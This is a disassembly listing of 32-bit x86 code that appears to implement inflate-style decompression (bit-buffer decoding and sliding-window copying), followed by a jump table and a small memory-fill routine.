  40850c:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40850f:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  408512:	c7 45 d0 09 00 00 00 	movl   $0x9,-0x30(%ebp)
  408519:	c7 45 c0 06 00 00 00 	movl   $0x6,-0x40(%ebp)
  408520:	e8 17 f7 ff ff       	call   0x407c3c
  408525:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  408529:	75 03                	jne    0x40852e
  40852b:	83 c8 ff             	or     $0xffffffff,%eax
  40852e:	85 c0                	test   %eax,%eax
  408530:	0f 85 06 fb ff ff    	jne    0x40803c
  408536:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408539:	50                   	push   %eax
  40853a:	8d 83 20 05 00 00    	lea    0x520(%ebx),%eax
  408540:	50                   	push   %eax
  408541:	8d 45 b8             	lea    -0x48(%ebp),%eax
  408544:	50                   	push   %eax
  408545:	8b 45 cc             	mov    -0x34(%ebp),%eax
  408548:	68 bc 9a 40 00       	push   $0x409abc
  40854d:	68 80 9a 40 00       	push   $0x409a80
  408552:	6a 00                	push   $0x0
  408554:	ff 75 ac             	push   -0x54(%ebp)
  408557:	8d 44 83 0c          	lea    0xc(%ebx,%eax,4),%eax
  40855b:	50                   	push   %eax
  40855c:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40855f:	e8 d8 f6 ff ff       	call   0x407c3c
  408564:	85 c0                	test   %eax,%eax
  408566:	0f 85 d0 fa ff ff    	jne    0x40803c
  40856c:	8b 45 c0             	mov    -0x40(%ebp),%eax
  40856f:	85 c0                	test   %eax,%eax
  408571:	75 0d                	jne    0x408580
  408573:	81 7d cc 01 01 00 00 	cmpl   $0x101,-0x34(%ebp)
  40857a:	0f 8f bc fa ff ff    	jg     0x40803c
  408580:	8a 4d d0             	mov    -0x30(%ebp),%cl
  408583:	83 23 00             	andl   $0x0,(%ebx)
  408586:	88 43 11             	mov    %al,0x11(%ebx)
  408589:	8b 45 b0             	mov    -0x50(%ebp),%eax
  40858c:	89 43 14             	mov    %eax,0x14(%ebx)
  40858f:	8b 45 b8             	mov    -0x48(%ebp),%eax
  408592:	88 4b 10             	mov    %cl,0x10(%ebx)
  408595:	89 43 18             	mov    %eax,0x18(%ebx)
  408598:	0f b6 43 10          	movzbl 0x10(%ebx),%eax
  40859c:	89 43 0c             	mov    %eax,0xc(%ebx)
  40859f:	8b 43 14             	mov    0x14(%ebx),%eax
  4085a2:	89 43 08             	mov    %eax,0x8(%ebx)
  4085a5:	c7 03 01 00 00 00    	movl   $0x1,(%ebx)
  4085ab:	8b 43 0c             	mov    0xc(%ebx),%eax
  4085ae:	eb 1f                	jmp    0x4085cf
  4085b0:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  4085b4:	0f 84 24 04 00 00    	je     0x4089de
  4085ba:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4085bd:	0f b6 11             	movzbl (%ecx),%edx
  4085c0:	ff 4d e4             	decl   -0x1c(%ebp)
  4085c3:	8b cf                	mov    %edi,%ecx
  4085c5:	d3 e2                	shl    %cl,%edx
  4085c7:	0b f2                	or     %edx,%esi
  4085c9:	ff 45 e0             	incl   -0x20(%ebp)
  4085cc:	83 c7 08             	add    $0x8,%edi
  4085cf:	3b f8                	cmp    %eax,%edi
  4085d1:	72 dd                	jb     0x4085b0
  4085d3:	0f b7 04 45 d0 b0 40 	movzwl 0x40b0d0(,%eax,2),%eax
  4085da:	00 
  4085db:	8b 4b 08             	mov    0x8(%ebx),%ecx
  4085de:	23 c6                	and    %esi,%eax
  4085e0:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  4085e3:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  4085e7:	d3 ee                	shr    %cl,%esi
  4085e9:	2b f9                	sub    %ecx,%edi
  4085eb:	0f b6 08             	movzbl (%eax),%ecx
  4085ee:	85 c9                	test   %ecx,%ecx
  4085f0:	89 75 d8             	mov    %esi,-0x28(%ebp)
  4085f3:	89 7d dc             	mov    %edi,-0x24(%ebp)
  4085f6:	75 12                	jne    0x40860a
  4085f8:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  4085fc:	89 43 08             	mov    %eax,0x8(%ebx)
  4085ff:	c7 03 06 00 00 00    	movl   $0x6,(%ebx)
  408605:	e9 6c 03 00 00       	jmp    0x408976
  40860a:	f6 c1 10             	test   $0x10,%cl
  40860d:	74 18                	je     0x408627
  40860f:	83 e1 0f             	and    $0xf,%ecx
  408612:	89 4b 08             	mov    %ecx,0x8(%ebx)
  408615:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  408619:	89 43 04             	mov    %eax,0x4(%ebx)
  40861c:	c7 03 02 00 00 00    	movl   $0x2,(%ebx)
  408622:	e9 4f 03 00 00       	jmp    0x408976
  408627:	f6 c1 40             	test   $0x40,%cl
  40862a:	75 12                	jne    0x40863e
  40862c:	89 4b 0c             	mov    %ecx,0xc(%ebx)
  40862f:	0f b7 48 02          	movzwl 0x2(%eax),%ecx
  408633:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  408636:	89 43 08             	mov    %eax,0x8(%ebx)
  408639:	e9 38 03 00 00       	jmp    0x408976
  40863e:	f6 c1 20             	test   $0x20,%cl
  408641:	0f 84 f5 f9 ff ff    	je     0x40803c
  408647:	c7 03 07 00 00 00    	movl   $0x7,(%ebx)
  40864d:	e9 24 03 00 00       	jmp    0x408976
  408652:	8b 43 08             	mov    0x8(%ebx),%eax
  408655:	eb 1f                	jmp    0x408676
  408657:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  40865b:	0f 84 7d 03 00 00    	je     0x4089de
  408661:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  408664:	0f b6 11             	movzbl (%ecx),%edx
  408667:	ff 4d e4             	decl   -0x1c(%ebp)
  40866a:	8b cf                	mov    %edi,%ecx
  40866c:	d3 e2                	shl    %cl,%edx
  40866e:	0b f2                	or     %edx,%esi
  408670:	ff 45 e0             	incl   -0x20(%ebp)
  408673:	83 c7 08             	add    $0x8,%edi
  408676:	3b f8                	cmp    %eax,%edi
  408678:	72 dd                	jb     0x408657
  40867a:	0f b7 0c 45 d0 b0 40 	movzwl 0x40b0d0(,%eax,2),%ecx
  408681:	00 
  408682:	23 ce                	and    %esi,%ecx
  408684:	01 4b 04             	add    %ecx,0x4(%ebx)
  408687:	8b c8                	mov    %eax,%ecx
  408689:	d3 ee                	shr    %cl,%esi
  40868b:	2b f8                	sub    %eax,%edi
  40868d:	0f b6 43 11          	movzbl 0x11(%ebx),%eax
  408691:	89 43 0c             	mov    %eax,0xc(%ebx)
  408694:	8b 43 18             	mov    0x18(%ebx),%eax
  408697:	89 43 08             	mov    %eax,0x8(%ebx)
  40869a:	c7 03 03 00 00 00    	movl   $0x3,(%ebx)
  4086a0:	8b 43 0c             	mov    0xc(%ebx),%eax
  4086a3:	eb 1f                	jmp    0x4086c4
  4086a5:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  4086a9:	0f 84 2f 03 00 00    	je     0x4089de
  4086af:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4086b2:	0f b6 11             	movzbl (%ecx),%edx
  4086b5:	ff 4d e4             	decl   -0x1c(%ebp)
  4086b8:	8b cf                	mov    %edi,%ecx
  4086ba:	d3 e2                	shl    %cl,%edx
  4086bc:	0b f2                	or     %edx,%esi
  4086be:	ff 45 e0             	incl   -0x20(%ebp)
  4086c1:	83 c7 08             	add    $0x8,%edi
  4086c4:	3b f8                	cmp    %eax,%edi
  4086c6:	72 dd                	jb     0x4086a5
  4086c8:	0f b7 04 45 d0 b0 40 	movzwl 0x40b0d0(,%eax,2),%eax
  4086cf:	00 
  4086d0:	8b 4b 08             	mov    0x8(%ebx),%ecx
  4086d3:	23 c6                	and    %esi,%eax
  4086d5:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  4086d8:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  4086dc:	d3 ee                	shr    %cl,%esi
  4086de:	2b f9                	sub    %ecx,%edi
  4086e0:	0f b6 08             	movzbl (%eax),%ecx
  4086e3:	f6 c1 10             	test   $0x10,%cl
  4086e6:	89 75 d8             	mov    %esi,-0x28(%ebp)
  4086e9:	89 7d dc             	mov    %edi,-0x24(%ebp)
  4086ec:	74 18                	je     0x408706
  4086ee:	83 e1 0f             	and    $0xf,%ecx
  4086f1:	89 4b 08             	mov    %ecx,0x8(%ebx)
  4086f4:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  4086f8:	89 43 0c             	mov    %eax,0xc(%ebx)
  4086fb:	c7 03 04 00 00 00    	movl   $0x4,(%ebx)
  408701:	e9 70 02 00 00       	jmp    0x408976
  408706:	f6 c1 40             	test   $0x40,%cl
  408709:	0f 85 2d f9 ff ff    	jne    0x40803c
  40870f:	e9 18 ff ff ff       	jmp    0x40862c
  408714:	8b 43 08             	mov    0x8(%ebx),%eax
  408717:	eb 1f                	jmp    0x408738
  408719:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  40871d:	0f 84 bb 02 00 00    	je     0x4089de
  408723:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  408726:	0f b6 11             	movzbl (%ecx),%edx
  408729:	ff 4d e4             	decl   -0x1c(%ebp)
  40872c:	8b cf                	mov    %edi,%ecx
  40872e:	d3 e2                	shl    %cl,%edx
  408730:	0b f2                	or     %edx,%esi
  408732:	ff 45 e0             	incl   -0x20(%ebp)
  408735:	83 c7 08             	add    $0x8,%edi
  408738:	3b f8                	cmp    %eax,%edi
  40873a:	72 dd                	jb     0x408719
  40873c:	0f b7 0c 45 d0 b0 40 	movzwl 0x40b0d0(,%eax,2),%ecx
  408743:	00 
  408744:	23 ce                	and    %esi,%ecx
  408746:	01 4b 0c             	add    %ecx,0xc(%ebx)
  408749:	8b c8                	mov    %eax,%ecx
  40874b:	d3 ee                	shr    %cl,%esi
  40874d:	2b f8                	sub    %eax,%edi
  40874f:	89 7d dc             	mov    %edi,-0x24(%ebp)
  408752:	c7 03 05 00 00 00    	movl   $0x5,(%ebx)
  408758:	89 75 d8             	mov    %esi,-0x28(%ebp)
  40875b:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40875e:	8b 4b 0c             	mov    0xc(%ebx),%ecx
  408761:	8b d0                	mov    %eax,%edx
  408763:	2b d3                	sub    %ebx,%edx
  408765:	81 ea a0 1b 00 00    	sub    $0x1ba0,%edx
  40876b:	3b d1                	cmp    %ecx,%edx
  40876d:	73 16                	jae    0x408785
  40876f:	8b 93 a0 9b 00 00    	mov    0x9ba0(%ebx),%edx
  408775:	2b d1                	sub    %ecx,%edx
  408777:	2b d3                	sub    %ebx,%edx
  408779:	8d bc 02 60 e4 ff ff 	lea    -0x1ba0(%edx,%eax,1),%edi
  408780:	e9 ca 00 00 00       	jmp    0x40884f
  408785:	8b f8                	mov    %eax,%edi
  408787:	2b f9                	sub    %ecx,%edi
  408789:	e9 c1 00 00 00       	jmp    0x40884f
  40878e:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  408792:	0f 85 97 00 00 00    	jne    0x40882f
  408798:	8b 8b a0 9b 00 00    	mov    0x9ba0(%ebx),%ecx
  40879e:	3b c1                	cmp    %ecx,%eax
  4087a0:	75 28                	jne    0x4087ca
  4087a2:	8b 83 a4 9b 00 00    	mov    0x9ba4(%ebx),%eax
  4087a8:	8d 93 a0 1b 00 00    	lea    0x1ba0(%ebx),%edx
  4087ae:	3b d0                	cmp    %eax,%edx
  4087b0:	74 18                	je     0x4087ca
  4087b2:	89 55 e8             	mov    %edx,-0x18(%ebp)
  4087b5:	73 08                	jae    0x4087bf
  4087b7:	2b c2                	sub    %edx,%eax
  4087b9:	48                   	dec    %eax
  4087ba:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4087bd:	eb 05                	jmp    0x4087c4
  4087bf:	2b ca                	sub    %edx,%ecx
  4087c1:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4087c4:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  4087c8:	75 65                	jne    0x40882f
  4087ca:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4087cd:	8b 75 08             	mov    0x8(%ebp),%esi
  4087d0:	89 83 a8 9b 00 00    	mov    %eax,0x9ba8(%ebx)
  4087d6:	e8 01 f4 ff ff       	call   0x407bdc
  4087db:	8b b3 a8 9b 00 00    	mov    0x9ba8(%ebx),%esi
  4087e1:	8b 8b a4 9b 00 00    	mov    0x9ba4(%ebx),%ecx
  4087e7:	3b f1                	cmp    %ecx,%esi
  4087e9:	89 75 e8             	mov    %esi,-0x18(%ebp)
  4087ec:	73 07                	jae    0x4087f5
  4087ee:	8b c1                	mov    %ecx,%eax
  4087f0:	2b c6                	sub    %esi,%eax
  4087f2:	48                   	dec    %eax
  4087f3:	eb 08                	jmp    0x4087fd
  4087f5:	8b 83 a0 9b 00 00    	mov    0x9ba0(%ebx),%eax
  4087fb:	2b c6                	sub    %esi,%eax
  4087fd:	8b 93 a0 9b 00 00    	mov    0x9ba0(%ebx),%edx
  408803:	3b f2                	cmp    %edx,%esi
  408805:	89 45 ec             	mov    %eax,-0x14(%ebp)
  408808:	75 1d                	jne    0x408827
  40880a:	8d b3 a0 1b 00 00    	lea    0x1ba0(%ebx),%esi
  408810:	3b f1                	cmp    %ecx,%esi
  408812:	74 13                	je     0x408827
  408814:	89 75 e8             	mov    %esi,-0x18(%ebp)
  408817:	73 07                	jae    0x408820
  408819:	2b ce                	sub    %esi,%ecx
  40881b:	49                   	dec    %ecx
  40881c:	8b c1                	mov    %ecx,%eax
  40881e:	eb 04                	jmp    0x408824
  408820:	2b d6                	sub    %esi,%edx
  408822:	8b c2                	mov    %edx,%eax
  408824:	89 45 ec             	mov    %eax,-0x14(%ebp)
  408827:	85 c0                	test   %eax,%eax
  408829:	0f 84 02 02 00 00    	je     0x408a31
  40882f:	8b 45 e8             	mov    -0x18(%ebp),%eax
  408832:	8a 0f                	mov    (%edi),%cl
  408834:	88 08                	mov    %cl,(%eax)
  408836:	40                   	inc    %eax
  408837:	47                   	inc    %edi
  408838:	ff 4d ec             	decl   -0x14(%ebp)
  40883b:	3b bb a0 9b 00 00    	cmp    0x9ba0(%ebx),%edi
  408841:	89 45 e8             	mov    %eax,-0x18(%ebp)
  408844:	75 06                	jne    0x40884c
  408846:	8d bb a0 1b 00 00    	lea    0x1ba0(%ebx),%edi
  40884c:	ff 4b 04             	decl   0x4(%ebx)
  40884f:	83 7b 04 00          	cmpl   $0x0,0x4(%ebx)
  408853:	0f 85 35 ff ff ff    	jne    0x40878e
  408859:	83 23 00             	andl   $0x0,(%ebx)
  40885c:	e9 15 01 00 00       	jmp    0x408976
  408861:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  408865:	0f 85 98 00 00 00    	jne    0x408903
  40886b:	8b 8b a0 9b 00 00    	mov    0x9ba0(%ebx),%ecx
  408871:	39 4d e8             	cmp    %ecx,-0x18(%ebp)
  408874:	75 28                	jne    0x40889e
  408876:	8b 83 a4 9b 00 00    	mov    0x9ba4(%ebx),%eax
  40887c:	8d 93 a0 1b 00 00    	lea    0x1ba0(%ebx),%edx
  408882:	3b d0                	cmp    %eax,%edx
  408884:	74 18                	je     0x40889e
  408886:	89 55 e8             	mov    %edx,-0x18(%ebp)
  408889:	73 08                	jae    0x408893
  40888b:	2b c2                	sub    %edx,%eax
  40888d:	48                   	dec    %eax
  40888e:	89 45 ec             	mov    %eax,-0x14(%ebp)
  408891:	eb 05                	jmp    0x408898
  408893:	2b ca                	sub    %edx,%ecx
  408895:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  408898:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  40889c:	75 65                	jne    0x408903
  40889e:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4088a1:	8b 75 08             	mov    0x8(%ebp),%esi
  4088a4:	89 83 a8 9b 00 00    	mov    %eax,0x9ba8(%ebx)
  4088aa:	e8 2d f3 ff ff       	call   0x407bdc
  4088af:	8b b3 a8 9b 00 00    	mov    0x9ba8(%ebx),%esi
  4088b5:	8b 8b a4 9b 00 00    	mov    0x9ba4(%ebx),%ecx
  4088bb:	3b f1                	cmp    %ecx,%esi
  4088bd:	89 75 e8             	mov    %esi,-0x18(%ebp)
  4088c0:	73 07                	jae    0x4088c9
  4088c2:	8b c1                	mov    %ecx,%eax
  4088c4:	2b c6                	sub    %esi,%eax
  4088c6:	48                   	dec    %eax
  4088c7:	eb 08                	jmp    0x4088d1
  4088c9:	8b 83 a0 9b 00 00    	mov    0x9ba0(%ebx),%eax
  4088cf:	2b c6                	sub    %esi,%eax
  4088d1:	8b 93 a0 9b 00 00    	mov    0x9ba0(%ebx),%edx
  4088d7:	3b f2                	cmp    %edx,%esi
  4088d9:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4088dc:	75 1d                	jne    0x4088fb
  4088de:	8d b3 a0 1b 00 00    	lea    0x1ba0(%ebx),%esi
  4088e4:	3b f1                	cmp    %ecx,%esi
  4088e6:	74 13                	je     0x4088fb
  4088e8:	89 75 e8             	mov    %esi,-0x18(%ebp)
  4088eb:	73 07                	jae    0x4088f4
  4088ed:	2b ce                	sub    %esi,%ecx
  4088ef:	49                   	dec    %ecx
  4088f0:	8b c1                	mov    %ecx,%eax
  4088f2:	eb 04                	jmp    0x4088f8
  4088f4:	2b d6                	sub    %esi,%edx
  4088f6:	8b c2                	mov    %edx,%eax
  4088f8:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4088fb:	85 c0                	test   %eax,%eax
  4088fd:	0f 84 2e 01 00 00    	je     0x408a31
  408903:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  408906:	8a 43 08             	mov    0x8(%ebx),%al
  408909:	ff 45 e8             	incl   -0x18(%ebp)
  40890c:	ff 4d ec             	decl   -0x14(%ebp)
  40890f:	88 01                	mov    %al,(%ecx)
  408911:	e9 43 ff ff ff       	jmp    0x408859
  408916:	83 ff 07             	cmp    $0x7,%edi
  408919:	76 0c                	jbe    0x408927
  40891b:	83 ef 08             	sub    $0x8,%edi
  40891e:	ff 45 e4             	incl   -0x1c(%ebp)
  408921:	ff 4d e0             	decl   -0x20(%ebp)
  408924:	89 7d dc             	mov    %edi,-0x24(%ebp)
  408927:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40892a:	8b 75 08             	mov    0x8(%ebp),%esi
  40892d:	89 83 a8 9b 00 00    	mov    %eax,0x9ba8(%ebx)
  408933:	e8 a4 f2 ff ff       	call   0x407bdc
  408938:	8b 8b a8 9b 00 00    	mov    0x9ba8(%ebx),%ecx
  40893e:	8b 93 a4 9b 00 00    	mov    0x9ba4(%ebx),%edx
  408944:	3b ca                	cmp    %edx,%ecx
  408946:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  408949:	73 07                	jae    0x408952
  40894b:	8b c2                	mov    %edx,%eax
  40894d:	2b c1                	sub    %ecx,%eax
  40894f:	48                   	dec    %eax
  408950:	eb 08                	jmp    0x40895a
  408952:	8b 83 a0 9b 00 00    	mov    0x9ba0(%ebx),%eax
  408958:	2b c1                	sub    %ecx,%eax
  40895a:	3b ca                	cmp    %edx,%ecx
  40895c:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40895f:	0f 85 ed 00 00 00    	jne    0x408a52
  408965:	8b 83 14 05 00 00    	mov    0x514(%ebx),%eax
  40896b:	83 f8 08             	cmp    $0x8,%eax
  40896e:	89 03                	mov    %eax,(%ebx)
  408970:	0f 85 f6 00 00 00    	jne    0x408a6c
  408976:	8b 75 d8             	mov    -0x28(%ebp),%esi
  408979:	8b 7d dc             	mov    -0x24(%ebp),%edi
  40897c:	8b 03                	mov    (%ebx),%eax
  40897e:	83 f8 0f             	cmp    $0xf,%eax
  408981:	0f 86 46 f6 ff ff    	jbe    0x407fcd
  408987:	e9 b0 f6 ff ff       	jmp    0x40803c
  40898c:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40898f:	8b 75 08             	mov    0x8(%ebp),%esi
  408992:	89 83 1c 05 00 00    	mov    %eax,0x51c(%ebx)
  408998:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40899b:	89 83 18 05 00 00    	mov    %eax,0x518(%ebx)
  4089a1:	83 66 04 00          	andl   $0x0,0x4(%esi)
  4089a5:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4089a8:	89 06                	mov    %eax,(%esi)
  4089aa:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4089ad:	89 83 a8 9b 00 00    	mov    %eax,0x9ba8(%ebx)
  4089b3:	e8 24 f2 ff ff       	call   0x407bdc
  4089b8:	33 c0                	xor    %eax,%eax
  4089ba:	5f                   	pop    %edi
  4089bb:	5e                   	pop    %esi
  4089bc:	5b                   	pop    %ebx
  4089bd:	c9                   	leave
  4089be:	c2 04 00             	ret    $0x4
  4089c1:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4089c4:	8b 75 08             	mov    0x8(%ebp),%esi
  4089c7:	89 83 1c 05 00 00    	mov    %eax,0x51c(%ebx)
  4089cd:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4089d0:	89 83 18 05 00 00    	mov    %eax,0x518(%ebx)
  4089d6:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4089d9:	89 46 04             	mov    %eax,0x4(%esi)
  4089dc:	eb c7                	jmp    0x4089a5
  4089de:	8b 45 08             	mov    0x8(%ebp),%eax
  4089e1:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4089e5:	89 b3 1c 05 00 00    	mov    %esi,0x51c(%ebx)
  4089eb:	89 bb 18 05 00 00    	mov    %edi,0x518(%ebx)
  4089f1:	83 60 04 00          	andl   $0x0,0x4(%eax)
  4089f5:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4089f8:	8b 75 08             	mov    0x8(%ebp),%esi
  4089fb:	89 06                	mov    %eax,(%esi)
  4089fd:	8b 45 e8             	mov    -0x18(%ebp),%eax
  408a00:	89 83 a8 9b 00 00    	mov    %eax,0x9ba8(%ebx)
  408a06:	e8 d1 f1 ff ff       	call   0x407bdc
  408a0b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408a0e:	eb aa                	jmp    0x4089ba
  408a10:	8b 45 08             	mov    0x8(%ebp),%eax
  408a13:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  408a16:	c7 03 11 00 00 00    	movl   $0x11,(%ebx)
  408a1c:	89 b3 1c 05 00 00    	mov    %esi,0x51c(%ebx)
  408a22:	89 bb 18 05 00 00    	mov    %edi,0x518(%ebx)
  408a28:	89 48 04             	mov    %ecx,0x4(%eax)
  408a2b:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  408a2f:	eb c4                	jmp    0x4089f5
  408a31:	8b 45 d8             	mov    -0x28(%ebp),%eax
  408a34:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408a37:	89 83 1c 05 00 00    	mov    %eax,0x51c(%ebx)
  408a3d:	8b 45 dc             	mov    -0x24(%ebp),%eax
  408a40:	89 83 18 05 00 00    	mov    %eax,0x518(%ebx)
  408a46:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  408a49:	89 41 04             	mov    %eax,0x4(%ecx)
  408a4c:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  408a50:	eb a3                	jmp    0x4089f5
  408a52:	8b 45 d8             	mov    -0x28(%ebp),%eax
  408a55:	89 83 1c 05 00 00    	mov    %eax,0x51c(%ebx)
  408a5b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  408a5e:	89 83 18 05 00 00    	mov    %eax,0x518(%ebx)
  408a64:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  408a67:	89 46 04             	mov    %eax,0x4(%esi)
  408a6a:	eb e0                	jmp    0x408a4c
  408a6c:	8b 45 d8             	mov    -0x28(%ebp),%eax
  408a6f:	89 83 1c 05 00 00    	mov    %eax,0x51c(%ebx)
  408a75:	8b 45 dc             	mov    -0x24(%ebp),%eax
  408a78:	89 83 18 05 00 00    	mov    %eax,0x518(%ebx)
  408a7e:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  408a81:	8b ce                	mov    %esi,%ecx
  408a83:	89 41 04             	mov    %eax,0x4(%ecx)
  408a86:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  408a8d:	e9 63 ff ff ff       	jmp    0x4089f5
  408a92:	8b ff                	mov    %edi,%edi
  408a94:	98                   	cwtl
  408a95:	85 40 00             	test   %eax,0x0(%eax)
  408a98:	ab                   	stos   %eax,%es:(%edi)
  408a99:	85 40 00             	test   %eax,0x0(%eax)
  408a9c:	52                   	push   %edx
  408a9d:	86 40 00             	xchg   %al,0x0(%eax)
  408aa0:	a0 86 40 00 14       	mov    0x14004086,%al
  408aa5:	87 40 00             	xchg   %eax,0x0(%eax)
  408aa8:	5b                   	pop    %ebx
  408aa9:	87 40 00             	xchg   %eax,0x0(%eax)
  408aac:	61                   	popa
  408aad:	88 40 00             	mov    %al,0x0(%eax)
  408ab0:	16                   	push   %ss
  408ab1:	89 40 00             	mov    %eax,0x0(%eax)
  408ab4:	f9                   	stc
  408ab5:	7f 40                	jg     0x408af7
  408ab7:	00 62 81             	add    %ah,-0x7f(%edx)
  408aba:	40                   	inc    %eax
  408abb:	00 8c 81 40 00 90 82 	add    %cl,-0x7d6fffc0(%ecx,%eax,4)
  408ac2:	40                   	inc    %eax
  408ac3:	00 15 83 40 00 ab    	add    %dl,0xab004083
  408ac9:	84 40 00             	test   %al,0x0(%eax)
  408acc:	3c 80                	cmp    $0x80,%al
  408ace:	40                   	inc    %eax
  408acf:	00 27                	add    %ah,(%edi)
  408ad1:	89 40 00             	mov    %eax,0x0(%eax)
  408ad4:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  408ad8:	85 c9                	test   %ecx,%ecx
  408ada:	76 26                	jbe    0x408b02
  408adc:	8a 44 24 08          	mov    0x8(%esp),%al
  408ae0:	53                   	push   %ebx
  408ae1:	8a d8                	mov    %al,%bl
  408ae3:	8a fb                	mov    %bl,%bh
  408ae5:	8b d1                	mov    %ecx,%edx
  408ae7:	57                   	push   %edi
  408ae8:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  408aec:	c1 e9 02             	shr    $0x2,%ecx
  408aef:	8b c3                	mov    %ebx,%eax
  408af1:	c1 e0 10             	shl    $0x10,%eax
  408af4:	66 8b c3             	mov    %bx,%ax
  408af7:	f3 ab                	rep stos %eax,%es:(%edi)
  408af9:	8b ca                	mov    %edx,%ecx
  408afb:	83 e1 03             	and    $0x3,%ecx
  408afe:	f3 aa                	rep stos %al,%es:(%edi)
  408b00:	5f                   	pop    %edi
  408b01:	5b                   	pop    %ebx
  408b02:	8b 44 24 04          	mov    0x4(%esp),%eax
  408b06:	c3                   	ret
